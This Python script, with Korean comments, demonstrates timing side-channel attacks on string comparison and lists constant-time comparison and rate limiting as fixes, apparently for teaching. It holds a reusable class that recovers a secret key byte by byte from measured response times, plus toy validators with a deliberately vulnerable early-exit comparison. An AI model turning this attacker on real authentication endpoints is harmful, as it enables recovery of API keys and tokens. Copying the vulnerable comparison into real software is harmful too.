#!/usr/bin/env python3
"""
타이밍 공격 Exploit
공격 방법: 응답 시간을 측정하여 비밀 값을 한 바이트씩 복구
"""

import time
import statistics
import hashlib

class TimingAttacker:
    """타이밍 공격 수행 클래스"""

    def __init__(self, validation_func, num_samples=10):
        """
        Args:
            validation_func: 검증 함수 (user, key) -> bool
            num_samples: 각 시도당 측정 횟수 (노이즈 제거용)
        """
        self.validation_func = validation_func
        self.num_samples = num_samples

    def measure_time(self, user: str, test_key: str) -> float:
        """검증 시간 측정 (평균)"""
        times = []
        for _ in range(self.num_samples):
            start = time.perf_counter()
            self.validation_func(user, test_key)
            elapsed = time.perf_counter() - start
            times.append(elapsed)

        # 중간값 사용 (이상치 제거)
        return statistics.median(times)

    def attack_byte_by_byte(self, user: str, key_length: int, charset: str) -> str:
        """
        바이트별 타이밍 공격

        Args:
            user: 타겟 사용자
            key_length: 키 길이
            charset: 가능한 문자 집합

        Returns:
            복구된 키
        """
        recovered_key = ""

        print(f"[*] 타이밍 공격 시작 (키 길이: {key_length})\n")

        for position in range(key_length):
            best_char = None
            max_time = 0

            print(f"[*] 위치 {position + 1}/{key_length} 공격 중...")

            # 각 문자를 시도
            char_times = []
            for char in charset:
                test_key = recovered_key + char + "x" * (key_length - position - 1)
                elapsed = self.measure_time(user, test_key)
                char_times.append((char, elapsed))

                # 가장 오래 걸린 문자 = 올바른 문자
                if elapsed > max_time:
                    max_time = elapsed
                    best_char = char

            # 상위 5개 출력 (디버깅용)
            char_times.sort(key=lambda x: x[1], reverse=True)
            print(f"    상위 후보: {char_times[:5]}")

            recovered_key += best_char
            print(f"    발견: '{best_char}' -> 현재: '{recovered_key}'\n")

        return recovered_key

def exploit_api_key_validation():
    """API 키 검증 타이밍 공격"""
    print("=== API 키 타이밍 공격 데모 ===\n")

    # 취약한 검증 함수 (지연 포함)
    class VulnerableValidator:
        def __init__(self):
            self.valid_keys = {
                "user1": "abc123def456ghi789jkl"
            }

        def validate_with_delay(self, user: str, api_key: str) -> bool:
            if user not in self.valid_keys:
                return False

            expected_key = self.valid_keys[user]

            for i in range(min(len(api_key), len(expected_key))):
                if api_key[i] != expected_key[i]:
                    return False
                time.sleep(0.0001)  # 0.1ms 지연

            return len(api_key) == len(expected_key)

    validator = VulnerableValidator()
    correct_key = validator.valid_keys["user1"]

    print(f"타겟: user1")
    print(f"실제 키: {correct_key}")
    print(f"키 길이: {len(correct_key)}\n")

    # 공격 시작
    attacker = TimingAttacker(validator.validate_with_delay, num_samples=5)

    # 문자 집합 (알파벳 소문자 + 숫자)
    charset = "abcdefghijklmnopqrstuvwxyz0123456789"

    recovered = attacker.attack_byte_by_byte("user1", len(correct_key), charset)

    print("=" * 60)
    print(f"[+] 공격 완료!")
    print(f"    복구된 키: {recovered}")
    print(f"    실제 키:   {correct_key}")
    print(f"    일치 여부: {recovered == correct_key}")
    print("=" * 60)

def demonstrate_timing_difference():
    """타이밍 차이 시연"""
    print("\n=== 타이밍 차이 분석 ===\n")

    class SimpleValidator:
        def __init__(self, secret: str):
            self.secret = secret

        def check_vulnerable(self, guess: str) -> bool:
            """취약한 검증"""
            for i in range(min(len(guess), len(self.secret))):
                if guess[i] != self.secret[i]:
                    return False
                time.sleep(0.0001)
            return guess == self.secret

    secret = "SECRET123"
    validator = SimpleValidator(secret)

    test_cases = [
        ("XXXXXXXXX", "완전히 틀림"),
        ("SXXXXXXXX", "1글자 일치"),
        ("SECXXXXXX", "3글자 일치"),
        ("SECRETXXX", "6글자 일치"),
        ("SECRET123", "완전 일치"),
    ]

    print(f"비밀 값: {secret}\n")
    print("테스트 케이스별 소요 시간:")

    for guess, description in test_cases:
        times = []
        for _ in range(10):
            start = time.perf_counter()
            validator.check_vulnerable(guess)
            elapsed = time.perf_counter() - start
            times.append(elapsed * 1000)  # ms로 변환

        avg_time = statistics.mean(times)
        matching = sum(a == b for a, b in zip(secret, guess))

        print(f"  {guess} ({description})")
        print(f"    일치 문자: {matching}, 평균 시간: {avg_time:.3f}ms\n")

    print("[!] 일치하는 문자가 많을수록 시간이 선형적으로 증가합니다!")

def statistical_timing_attack():
    """통계적 타이밍 공격 (노이즈 제거)"""
    print("\n=== 통계적 타이밍 공격 ===\n")

    secret_token = "ABCDEF"

    class NoisyValidator:
        def __init__(self, secret: str):
            self.secret = secret

        def validate(self, token: str) -> bool:
            import random
            # 랜덤 노이즈 추가
            time.sleep(random.uniform(0, 0.0001))

            for i in range(min(len(token), len(self.secret))):
                if token[i] != self.secret[i]:
                    return False
                time.sleep(0.0002)  # 실제 지연

            return token == self.secret

    validator = NoisyValidator(secret_token)

    print(f"비밀 토큰: {secret_token}")
    print("[*] 노이즈가 있는 환경에서 첫 번째 문자 공격...\n")

    charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    measurements = []

    # 각 문자를 여러 번 측정
    for char in charset[:10]:  # 처음 10개 문자만 (데모)
        test_token = char + "X" * 5
        times = []

        for _ in range(20):  # 20번 측정
            start = time.perf_counter()
            validator.validate(test_token)
            elapsed = time.perf_counter() - start
            times.append(elapsed * 1000)

        avg_time = statistics.mean(times)
        std_dev = statistics.stdev(times)
        measurements.append((char, avg_time, std_dev))

    # 결과 출력
    measurements.sort(key=lambda x: x[1], reverse=True)
    print("문자별 평균 시간 (상위 5개):")
    for char, avg, std in measurements[:5]:
        is_correct = "✓" if char == secret_token[0] else " "
        print(f"  {is_correct} '{char}': {avg:.3f}ms (±{std:.3f}ms)")

    print(f"\n[+] 가장 긴 시간: '{measurements[0][0]}' (정답: '{secret_token[0]}')")

if __name__ == "__main__":
    print("=" * 60)
    print("타이밍 공격 Exploit 데모")
    print("=" * 60 + "\n")

    # 1. 타이밍 차이 시연
    demonstrate_timing_difference()

    # 2. 통계적 타이밍 공격
    statistical_timing_attack()

    # 3. API 키 복구 공격 (시간이 오래 걸리므로 주석 처리)
    print("\n" + "=" * 60)
    print("실제 공격 데모 (시간 소요):")
    print("주석을 해제하여 실행 가능")
    print("=" * 60)
    # exploit_api_key_validation()

    print("\n" + "=" * 60)
    print("해결 방법:")
    print("1. hmac.compare_digest() 사용 (상수 시간 비교)")
    print("2. 모든 비교 연산을 상수 시간으로 수행")
    print("3. 인위적인 랜덤 지연 추가 (부분적 해결)")
    print("4. Rate limiting 적용")
    print("=" * 60)
